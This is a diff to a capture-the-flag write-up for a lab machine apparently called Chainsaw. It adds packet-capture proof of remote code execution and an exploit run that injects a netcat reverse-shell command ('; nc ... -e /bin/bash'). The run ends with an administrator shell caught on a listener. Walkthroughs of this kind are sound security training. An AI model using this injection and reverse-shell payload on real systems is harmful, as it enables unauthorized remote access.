@@ -112,13 +112,30 @@ Now that we know we can do RCE, lets replace the ping with our payload.
 
 
 Capturing packets:
+```python
 
-➜  ~ tcpdump -i tun0 icmp -n
+➜  chainsaw tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
-13:20:24.477177 IP 10.10.14.35 > 10.10.10.142: ICMP echo request, id 49854, seq 1, length 64
-13:20:25.494467 IP 10.10.14.35 > 10.10.10.142: ICMP echo request, id 49854, seq 2, length 64
-13:20:26.522636 IP 10.10.14.35 > 10.10.10.142: ICMP echo request, id 49854, seq 3, length 64
+14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
+14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
+```
+
+###### Running the exploit
+
+> python3 chainsaw.py '; nc 10.10.14.35 4444 -e /bin/bash'
+
+###### Waiting for reverse shell
+
+```python
+
+➜  chainsaw nc -lvnp 4444                                           
+listening on [any] 4444 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.10.10.142] 40676
+id
+uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)
+```
+I quickly searched for the user.txt but it is not here, so back to further enumeration.
 
 
 
